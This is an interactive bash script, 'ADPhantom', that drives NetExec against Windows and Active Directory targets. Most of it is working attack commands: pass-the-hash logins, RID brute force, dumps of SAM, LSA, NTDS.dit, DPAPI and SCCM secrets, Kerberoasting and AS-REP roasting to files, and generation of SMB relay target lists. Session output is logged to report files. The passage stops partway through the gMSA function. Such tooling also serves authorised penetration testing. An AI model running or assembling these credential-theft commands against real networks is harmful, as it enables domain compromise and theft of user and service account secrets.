#!/bin/bash

# NetExec Interactive Script
# Version: 3.1
# Description: Interactive script to run netexec commands with complete credential gathering and enumeration options

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Configuration file to save settings
CONFIG_FILE="$HOME/.netexec_config"

# Logging setup
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOG_DIR="$(cd "$(dirname "$0")" && pwd)/reports"
LOG_FILE="$LOG_DIR/session_${TIMESTAMP}.log"
REPORT_TXT="$LOG_DIR/report_${TIMESTAMP}.txt"
REPORT_HTML="$LOG_DIR/report_${TIMESTAMP}.html"
mkdir -p "$LOG_DIR"

# Write session header to log
{
    echo "SESSION_START=$(date '+%Y-%m-%d %H:%M:%S')"
    echo "HOSTNAME=$(hostname)"
    echo "USER_RUNNING=$(whoami)"
} >> "$LOG_FILE"

# Wrapper: run netexec, display output AND save to log
nxcrun() {
    echo "" >> "$LOG_FILE"
    echo "[$(date '+%H:%M:%S')] CMD: netexec $*" >> "$LOG_FILE"
    netexec "$@" 2>&1 | tee -a "$LOG_FILE"
}

# Log a section header
log_section() {
    {
        echo ""
        echo "════════════════════════════════════════"
        echo "  $1"
        echo "════════════════════════════════════════"
    } >> "$LOG_FILE"
}

# Function to print banner
print_banner() {
    clear
    echo -e "${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║     ADPhantom Ultimate Tool        ║${NC}"
    echo -e "${BLUE}║     Credential & Enumeration Master   ║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    echo ""
}

# Function to get target IP
get_target() {
    if [ -f "$CONFIG_FILE" ] && [ -s "$CONFIG_FILE" ]; then
        source "$CONFIG_FILE"
        echo -e "${CYAN}Last used target: $TARGET${NC}"
        read -p "Use last target? (y/n): " use_last
        if [[ $use_last == "y" || $use_last == "Y" ]]; then
            return
        fi
    fi
    
    echo -e "${YELLOW}Enter target IP/Domain:${NC}"
    read -p "> " TARGET
    echo "TARGET=$TARGET" > "$CONFIG_FILE"
}

# Function to get credentials
get_credentials() {
    echo -e "${YELLOW}Do you want to use credentials? (y/n):${NC}"
    read -p "> " use_creds

    if [[ $use_creds == "y" || $use_creds == "Y" ]]; then

        # ── Username: single or file ──────────────────────────
        echo -e "\n${YELLOW}Username type:${NC}"
        echo "1) Single username"
        echo "2) From file (userlist)"
        read -p "> " user_type

        if [[ $user_type == "2" ]]; then
            while true; do
                echo -e "${YELLOW}Enter path to username file:${NC}"
                read -p "> " USERNAME_FILE
                if [ -f "$USERNAME_FILE" ]; then
                    USERNAME="[file: $USERNAME_FILE]"
                    USER_OPT="-u $USERNAME_FILE"
                    break
                else
                    echo -e "${RED}[!] File not found: $USERNAME_FILE${NC}"
                fi
            done
        else
            echo -e "${YELLOW}Enter Username:${NC}"
            read -p "> " USERNAME
            USER_OPT="-u $USERNAME"
            USERNAME_FILE=""
        fi

        # ── Auth: password or NTLM hash ───────────────────────
        echo -e "\n${YELLOW}Authentication type:${NC}"
        echo "1) Password"
        echo "2) NTLM Hash"
        read -p "> " auth_type

        if [[ $auth_type == "2" ]]; then
            echo -e "${YELLOW}Enter NTLM Hash:${NC}"
            read -s -p "> " HASH
            echo ""
            PASSWORD=""
            AUTH_CRED="-H $HASH"
        else
            echo -e "${YELLOW}Enter Password:${NC}"
            read -s -p "> " PASSWORD
            echo ""
            HASH=""
            AUTH_CRED="-p $PASSWORD"
        fi

        # ── Domain ────────────────────────────────────────────
        echo -e "${YELLOW}Enter Domain (optional, press Enter to skip):${NC}"
        read -p "> " DOMAIN
        if [ ! -z "$DOMAIN" ]; then
            DOMAIN_OPTION="-d $DOMAIN"
        else
            DOMAIN_OPTION=""
        fi

        # ── Local Auth ────────────────────────────────────────
        echo -e "${YELLOW}Use local authentication? (y/n):${NC}"
        read -p "> " use_local
        if [[ $use_local == "y" || $use_local == "Y" ]]; then
            LOCAL_AUTH="--local-auth"
        else
            LOCAL_AUTH=""
        fi

        # ── Kerberos ──────────────────────────────────────────
        echo -e "${YELLOW}Use Kerberos? (y/n):${NC}"
        read -p "> " use_kerb
        if [[ $use_kerb == "y" || $use_kerb == "Y" ]]; then
            KERBEROS="-k"
        else
            KERBEROS=""
        fi

        # Save to config
        echo "USERNAME=$USERNAME" >> "$CONFIG_FILE"
        echo "DOMAIN=$DOMAIN" >> "$CONFIG_FILE"
    else
        USERNAME="''"
        USER_OPT="-u ''"
        AUTH_CRED="-p ''"
        PASSWORD=""
        HASH=""
        DOMAIN_OPTION=""
        LOCAL_AUTH=""
        KERBEROS=""
    fi
}

# Function to show main menu
show_menu() {
    echo -e "\n${GREEN}=== Main Menu ===${NC}"
    echo -e "${CYAN}Target  : $TARGET${NC}"
    echo -e "${CYAN}Username: $USERNAME${NC}"
    echo -e "${CYAN}Auth    : ${HASH:+Hash} ${PASSWORD:+Password}${NC}"
    echo -e "${CYAN}Domain  : ${DOMAIN:-'Not set'}${NC}"
    echo ""
    echo "1) 🔐 Authentication Tests"
    echo "2) 📋 Basic Enumeration"
    echo "3) 📁 SMB Enumeration"
    echo "4) 👥 LDAP Enumeration"
    echo "5) 🗄️ MSSQL Enumeration"
    echo "6) 📂 FTP Enumeration"
    echo "7) 💀 Credential Dumping (Advanced)"
    echo "8) 🔓 Vulnerability Checking"
    echo "9) 🛠️  Useful Modules"
    echo "10) 🔑 Password Spraying"
    echo "11) 🗺️  Mapping & Enumeration (Advanced)"
    echo "12) 🎯 All-in-One (Run Everything)"
    echo "13) ⚙️  Change Target/Credentials"
    echo "14) 🔑🔐 gMSA Operations"
    echo "15) 🔍 Advanced LDAP Queries"
    echo "16) 🧪 Hash Checking (NTLM/NetNTLM)"
    echo "0) ❌ Exit"
    echo ""
    read -p "Select option [0-16]: " choice
}

# Function to run authentication tests
run_auth() {
    log_section "Authentication Tests | Target: $TARGET"
    echo -e "\n${GREEN}=== Running Authentication Tests ===${NC}"
    
    echo -e "\n${YELLOW}[*] Null Authentication:${NC}"
    nxcrun smb "$TARGET" -u '' -p ''
    
    echo -e "\n${YELLOW}[*] Guest Authentication:${NC}"
    nxcrun smb "$TARGET" -u 'guest' -p ''
    
    if [ "$USERNAME" != "''" ]; then
        echo -e "\n${YELLOW}[*] Local Authentication:${NC}"
        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED --local-auth
        
        echo -e "\n${YELLOW}[*] SMB Signing Check:${NC}"
        nxcrun smb "$TARGET" --gen-relay-list "relay_${TARGET}.txt"
    fi
    
    read -p "Press Enter to continue..."
}

# Function to run hash checking
run_hash_check() {
    log_section "Hash Checking | Target: $TARGET"
    echo -e "\n${GREEN}=== Hash Checking ===${NC}"
    echo -e "${YELLOW}This option allows you to test NTLM hashes against the target${NC}\n"
    
    echo "Select hash type:"
    echo "1) 🔑 NTLM Hash (Single)"
    echo "2) 🔑 NTLM Hash (From file)"
    echo "3) 📝 NetNTLMv1 (Single)"
    echo "4) 📝 NetNTLMv1 (From file)"
    echo "5) 📋 NetNTLMv2 (Single)"
    echo "6) 📋 NetNTLMv2 (From file)"
    echo "7) 🔄 Convert NetNTLM to NTLM (using --ntlm)"
    echo "8) 🔙 Back to main menu"
    read -p "Choice [1-8]: " hash_choice
    
    case $hash_choice in
        1)
            echo -e "\n${YELLOW}[*] Testing single NTLM hash${NC}"
            read -p "Enter username: " hash_user
            read -p "Enter NTLM hash: " ntlm_hash
            read -p "Enter domain (or press Enter to skip): " hash_domain
            if [ -z "$hash_domain" ]; then
                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlm_hash" $LOCAL_AUTH $KERBEROS
            else
                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlm_hash" -d "$hash_domain" $KERBEROS
            fi
            ;;
        2)
            echo -e "\n${YELLOW}[*] Testing NTLM hashes from file${NC}"
            read -p "Enter path to hash file (format: username:hash or username:domain:hash): " hash_file
            if [ ! -f "$hash_file" ]; then
                echo -e "${RED}[!] File not found: $hash_file${NC}"
                read -p "Press Enter to continue..."
                return
            fi
            nxcrun smb "$TARGET" -H "$hash_file" $LOCAL_AUTH $KERBEROS
            ;;
        3)
            echo -e "\n${YELLOW}[*] Testing single NetNTLMv1 hash${NC}"
            read -p "Enter username: " hash_user
            read -p "Enter NetNTLMv1 hash: " ntlmv1_hash
            read -p "Enter domain (or press Enter to skip): " hash_domain
            if [ -z "$hash_domain" ]; then
                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlmv1_hash" --ntlmv1 $LOCAL_AUTH
            else
                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlmv1_hash" -d "$hash_domain" --ntlmv1
            fi
            ;;
        4)
            echo -e "\n${YELLOW}[*] Testing NetNTLMv1 hashes from file${NC}"
            read -p "Enter path to NetNTLMv1 hash file: " hash_file
            if [ ! -f "$hash_file" ]; then
                echo -e "${RED}[!] File not found: $hash_file${NC}"
                read -p "Press Enter to continue..."
                return
            fi
            nxcrun smb "$TARGET" -H "$hash_file" --ntlmv1 $LOCAL_AUTH
            ;;
        5)
            echo -e "\n${YELLOW}[*] Testing single NetNTLMv2 hash${NC}"
            read -p "Enter username: " hash_user
            read -p "Enter NetNTLMv2 hash: " ntlmv2_hash
            read -p "Enter domain (or press Enter to skip): " hash_domain
            if [ -z "$hash_domain" ]; then
                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlmv2_hash" --ntlmv2 $LOCAL_AUTH
            else
                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlmv2_hash" -d "$hash_domain" --ntlmv2
            fi
            ;;
        6)
            echo -e "\n${YELLOW}[*] Testing NetNTLMv2 hashes from file${NC}"
            read -p "Enter path to NetNTLMv2 hash file: " hash_file
            if [ ! -f "$hash_file" ]; then
                echo -e "${RED}[!] File not found: $hash_file${NC}"
                read -p "Press Enter to continue..."
                return
            fi
            nxcrun smb "$TARGET" -H "$hash_file" --ntlmv2 $LOCAL_AUTH
            ;;
        7)
            echo -e "\n${YELLOW}[*] Convert NetNTLM to NTLM (--ntlm)${NC}"
            echo -e "${CYAN}This option forces NetNTLM authentication for testing${NC}"
            read -p "Enter username: " hash_user
            read -p "Enter password/hash: " hash_pass
            read -p "Enter domain (or press Enter to skip): " hash_domain
            if [ -z "$hash_domain" ]; then
                nxcrun smb "$TARGET" -u "$hash_user" -p "$hash_pass" --ntlm
            else
                nxcrun smb "$TARGET" -u "$hash_user" -p "$hash_pass" -d "$hash_domain" --ntlm
            fi
            ;;
        8)
            return
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function to run basic enumeration
run_basic_enum() {
    log_section "Basic Enumeration | Target: $TARGET"
    echo -e "\n${GREEN}=== Running Basic Enumeration ===${NC}"
    
    echo -e "\n${YELLOW}[*] Basic SMB Info:${NC}"
    nxcrun smb "$TARGET"
    
    echo -e "\n${YELLOW}[*] List Shares:${NC}"
    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares
    
    echo -e "\n${YELLOW}[*] List Users:${NC}"
    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --users
    
    echo -e "\n${YELLOW}[*] RID Brute Force:${NC}"
    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute
    
    read -p "Press Enter to continue..."
}

# Function for advanced credential dumping
run_cred_dump_advanced() {
    log_section "Credential Dumping | Target: $TARGET"
    echo -e "\n${GREEN}=== Advanced Credential Dumping ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for credential dumping${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo "Select credential dumping method:"
    echo "1) 💾 SAM (Security Account Manager)"
    echo "2) 🔐 LSA Secrets"
    echo "3) 🏢 NTDS.dit (Domain Controller)"
    echo "4) 🔑 DPAPI (Data Protection API)"
    echo "5) 💻 SCCM (System Center Configuration Manager)"
    echo "6) 📋 All SAM/LSA/NTDS/DPAPI"
    echo "7) 🎯 Dump specific user from NTDS"
    echo "8) 🔙 Back to main menu"
    read -p "Choice [1-8]: " dump_choice
    
    case $dump_choice in
        1)
            echo -e "\n${YELLOW}[*] SAM Dump - Select method:${NC}"
            echo "1) regdump (Registry dump)"
            echo "2) secdump (Security dump)"
            read -p "Method [1-2]: " sam_method
            if [ "$sam_method" == "1" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam regdump
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam secdump
            fi
            ;;
        2)
            echo -e "\n${YELLOW}[*] LSA Dump - Select method:${NC}"
            echo "1) regdump (Registry dump)"
            echo "2) secdump (Security dump)"
            read -p "Method [1-2]: " lsa_method
            if [ "$lsa_method" == "1" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --lsa regdump
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --lsa secdump
            fi
            ;;
        3)
            echo -e "\n${YELLOW}[*] NTDS Dump - Select method:${NC}"
            echo "1) drsuapi (DRS RPC protocol)"
            echo "2) vss (Volume Shadow Copy)"
            read -p "Method [1-2]: " ntds_method
            read -p "Only dump enabled targets? (y/n): " enabled_only
            enabled_flag=""
            if [[ $enabled_only == "y" || $enabled_only == "Y" ]]; then
                enabled_flag="--enabled"
            fi
            
            if [ "$ntds_method" == "1" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --ntds drsuapi $enabled_flag
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --ntds vss $enabled_flag
            fi
            ;;
        4)
            echo -e "\n${YELLOW}[*] DPAPI Dump${NC}"
            echo "Options:"
            echo "- nosystem: Don't dump SYSTEM DPAPI"
            echo "- cookies: Dump cookies"
            echo "Example: nosystem cookies (dump cookies without SYSTEM)"
            read -p "Enter DPAPI options (press Enter for default): " dpapi_opts
            
            # Check for masterkey file
            read -p "Use masterkey file? (y/n): " use_mkfile
            mkfile_opt=""
            if [[ $use_mkfile == "y" || $use_mkfile == "Y" ]]; then
                read -p "Enter masterkey file path: " mkfile
                mkfile_opt="--mkfile $mkfile"
            fi
            
            # Check for PVK file
            read -p "Use domain backupkey file? (y/n): " use_pvk
            pvk_opt=""
            if [[ $use_pvk == "y" || $use_pvk == "Y" ]]; then
                read -p "Enter PVK file path: " pvk
                pvk_opt="--pvk $pvk"
            fi
            
            if [ -z "$dpapi_opts" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dpapi $mkfile_opt $pvk_opt
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dpapi $dpapi_opts $mkfile_opt $pvk_opt
            fi
            ;;
        5)
            echo -e "\n${YELLOW}[*] SCCM Dump - Select method:${NC}"
            echo "1) disk (Disk enumeration)"
            echo "2) wmi (WMI enumeration)"
            read -p "Method [1-2]: " sccm_method
            if [ "$sccm_method" == "1" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sccm disk
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sccm wmi
            fi
            ;;
        6)
            echo -e "\n${YELLOW}[*] Dumping all credentials...${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam --lsa --ntds --dpapi
            ;;
        7)
            echo -e "\n${YELLOW}[*] Dump specific user from NTDS${NC}"
            read -p "Enter username to dump: " target_user
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --ntds --user "$target_user"
            ;;
        8)
            return
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function for advanced mapping/enumeration
run_mapping_enum() {
    log_section "Advanced Mapping & Enumeration | Target: $TARGET"
    echo -e "\n${GREEN}=== Advanced Mapping & Enumeration ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for advanced enumeration${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo "Select enumeration type:"
    echo "1) 📁 Shares & Directories"
    echo "2) 🌐 Network Interfaces"
    echo "3) 💻 SMB Sessions"
    echo "4) 💾 Disks"
    echo "5) 👤 Logged-on Users"
    echo "6) 👥 Domain Users/Groups"
    echo "7) 🏠 Local Groups"
    echo "8) 🔐 Password Policy"
    echo "9) 🔢 RID Brute Force"
    echo "10) 🖥️ RDP Connections (qwinsta)"
    echo "11) ⚙️ Running Processes (tasklist)"
    echo "12) 📋 All-in-One Enumeration"
    echo "13) 🔙 Back to main menu"
    read -p "Choice [1-13]: " enum_choice
    
    case $enum_choice in
        1)
            echo -e "\n${YELLOW}[*] Share Enumeration${NC}"
            echo "1) List all shares"
            echo "2) List directory contents"
            echo "3) Filter shares by access"
            read -p "Choice [1-3]: " share_choice
            
            case $share_choice in
                1)
                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares
                    ;;
                2)
                    read -p "Enter directory path (default: root): " dir_path
                    if [ -z "$dir_path" ]; then
                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dir
                    else
                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dir "$dir_path"
                    fi
                    ;;
                3)
                    read -p "Filter by access (read/write/read,write): " filter
                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares --filter-shares "$filter"
                    ;;
            esac
            ;;
        2)
            echo -e "\n${YELLOW}[*] Network Interfaces:${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --interfaces
            ;;
        3)
            echo -e "\n${YELLOW}[*] SMB Sessions:${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --smb-sessions
            ;;
        4)
            echo -e "\n${YELLOW}[*] Disks:${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --disks
            ;;
        5)
            echo -e "\n${YELLOW}[*] Logged-on Users${NC}"
            echo "1) Enumerate all logged-on users"
            echo "2) Search for specific user"
            read -p "Choice [1-2]: " user_choice
            
            if [ "$user_choice" == "1" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --loggedon-users
            else
                read -p "Enter username to search (regex supported): " search_user
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --loggedon-users-filter "$search_user"
            fi
            ;;
        6)
            echo -e "\n${YELLOW}[*] Domain Users/Groups${NC}"
            echo "1) Enumerate all domain users"
            echo "2) Export users to file"
            echo "3) Enumerate specific user"
            echo "4) Enumerate groups"
            echo "5) Enumerate computers"
            read -p "Choice [1-5]: " domain_choice
            
            case $domain_choice in
                1)
                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users
                    ;;
                2)
                    read -p "Enter output filename: " export_file
                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users-export "$export_file"
                    ;;
                3)
                    read -p "Enter username: " specific_user
                    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users "$specific_user"
                    ;;
                4)
                    read -p "Enter group name (or press Enter for all groups): " group_name
                    if [ -z "$group_name" ]; then
                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --groups
                    else
                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --groups "$group_name"
                    fi
                    ;;
                5)
                    read -p "Enter computer name (or press Enter for all computers): " computer_name
                    if [ -z "$computer_name" ]; then
                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --computers
                    else
                        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --computers "$computer_name"
                    fi
                    ;;
            esac
            ;;
        7)
            echo -e "\n${YELLOW}[*] Local Groups${NC}"
            read -p "Enter local group name (or press Enter for all groups): " local_group
            if [ -z "$local_group" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --local-groups
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --local-groups "$local_group"
            fi
            ;;
        8)
            echo -e "\n${YELLOW}[*] Password Policy:${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --pass-pol
            ;;
        9)
            echo -e "\n${YELLOW}[*] RID Brute Force${NC}"
            read -p "Enter max RID (default: 4000): " max_rid
            if [ -z "$max_rid" ]; then
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute
            else
                nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute "$max_rid"
            fi
            ;;
        10)
            echo -e "\n${YELLOW}[*] RDP Connections (qwinsta):${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --qwinsta
            ;;
        11)
            echo -e "\n${YELLOW}[*] Running Processes (tasklist):${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --tasklist
            ;;
        12)
            echo -e "\n${YELLOW}[*] All-in-One Enumeration:${NC}"
            nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares --interfaces --smb-sessions --disks --loggedon-users --users --groups --local-groups --pass-pol --rid-brute --qwinsta --tasklist
            ;;
        13)
            return
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function to run SMB enumeration
run_smb_enum() {
    log_section "SMB Enumeration | Target: $TARGET"
    echo -e "\n${GREEN}=== Running SMB Enumeration ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for full SMB enumeration${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo -e "\n${YELLOW}[*] All-in-One SMB Enumeration:${NC}"
    nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --groups --local-groups --loggedon-users --sessions --shares --pass-pol
    
    echo -e "\n${YELLOW}[*] Running Spider_plus Module:${NC}"
    read -p "Spider_plus read-only? (y/n): " read_only
    if [[ $read_only == "n" || $read_only == "N" ]]; then
        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M spider_plus -o READ_ONLY=false
    else
        nxcrun smb "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M spider_plus
    fi
    
    read -p "Press Enter to continue..."
}

# Function to run LDAP enumeration
run_ldap_enum() {
    log_section "LDAP Enumeration | Target: $TARGET"
    echo -e "\n${GREEN}=== Running LDAP Enumeration ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "\n${YELLOW}[*] LDAP User Enumeration (Null):${NC}"
        nxcrun ldap "$TARGET" -u '' -p '' --users
        read -p "Press Enter to continue..."
        return
    fi
    
    echo -e "\n${YELLOW}[*] LDAP All-in-One (Basic):${NC}"
    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --trusted-for-delegation --password-not-required --admin-count --users --groups
    
    echo -e "\n${YELLOW}[*] Find Delegation Relationships:${NC}"
    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --find-delegation
    
    echo -e "\n${YELLOW}[*] Kerberoasting:${NC}"
    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --kerberoasting "kerberoast_${TARGET}.txt"
    
    echo -e "\n${YELLOW}[*] ASREProast:${NC}"
    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --asreproast "asreproast_${TARGET}.txt"
    
    echo -e "\n${YELLOW}[*] ADCS Enumeration:${NC}"
    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS -M adcs
    
    echo -e "\n${YELLOW}[*] MachineAccountQuota:${NC}"
    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS -M maq
    
    echo -e "\n${YELLOW}[*] gMSA (Group Managed Service Accounts):${NC}"
    nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --gmsa
    
    read -p "Press Enter to continue..."
}

# Function for advanced LDAP queries
run_advanced_ldap() {
    log_section "Advanced LDAP Queries | Target: $TARGET"
    echo -e "\n${GREEN}=== Advanced LDAP Queries ===${NC}"
    
    if [ "$USERNAME" == "''" ]; then
        echo -e "${RED}[!] Need credentials for advanced LDAP queries${NC}"
        read -p "Press Enter to continue..."
        return
    fi
    
    echo "Select advanced LDAP query:"
    echo "1) 🔍 Find Delegation Relationships"
    echo "2) 👑 Trusted for Delegation Users/Computers"
    echo "3) 🔓 Password Not Required Users"
    echo "4) 📊 Admin Count = 1 Users"
    echo "5) 👥 Enumerate Domain Users"
    echo "6) 📤 Export Users to File"
    echo "7) 📁 Set Custom Base DN"
    echo "8) 🔎 Custom LDAP Query"
    echo "9) 🔙 Back to main menu"
    read -p "Choice [1-9]: " ldap_choice
    
    case $ldap_choice in
        1)
            echo -e "\n${YELLOW}[*] Finding delegation relationships:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --find-delegation
            ;;
        2)
            echo -e "\n${YELLOW}[*] Users and computers trusted for delegation:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --trusted-for-delegation
            ;;
        3)
            echo -e "\n${YELLOW}[*] Users with PASSWD_NOTREQD flag:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --password-not-required
            ;;
        4)
            echo -e "\n${YELLOW}[*] Users with adminCount=1 (privileged users):${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --admin-count
            ;;
        5)
            echo -e "\n${YELLOW}[*] Enumerating domain users:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users
            ;;
        6)
            echo -e "\n${YELLOW}[*] Export users to file${NC}"
            read -p "Enter output filename (default: users_${TARGET}.txt): " user_export
            if [ -z "$user_export" ]; then
                user_export="users_${TARGET}.txt"
            fi
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --users-export "$user_export"
            echo -e "${GREEN}[+] Users exported to: $user_export${NC}"
            ;;
        7)
            echo -e "\n${YELLOW}[*] Set custom Base DN${NC}"
            echo -e "${CYAN}Example: DC=domain,DC=com${NC}"
            read -p "Enter Base DN: " base_dn
            echo -e "\n${YELLOW}[*] Testing with custom Base DN:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --base-dn "$base_dn" --users
            ;;
        8)
            echo -e "\n${YELLOW}[*] Custom LDAP Query${NC}"
            echo -e "${CYAN}Example filters:${NC}"
            echo "  - (objectClass=user)"
            echo "  - (&(objectClass=user)(adminCount=1))"
            echo "  - (servicePrincipalName=*/*)"
            echo "  - (objectClass=computer)"
            echo ""
            read -p "Enter LDAP filter: " ldap_filter
            read -p "Enter attributes to return (comma-separated, default: *): " ldap_attrs
            if [ -z "$ldap_attrs" ]; then
                ldap_attrs="*"
            fi
            
            echo -e "\n${YELLOW}[*] Running custom query:${NC}"
            nxcrun ldap "$TARGET" $USER_OPT $AUTH_CRED $DOMAIN_OPTION $KERBEROS --query "$ldap_filter" "$ldap_attrs"
            ;;
        9)
            return
            ;;
        *)
            echo -e "${RED}Invalid choice${NC}"
            ;;
    esac
    
    read -p "Press Enter to continue..."
}

# Function for gMSA operations
run_gmsa_ops() {
    log_section "gMSA Operations | Target: $TARGET"
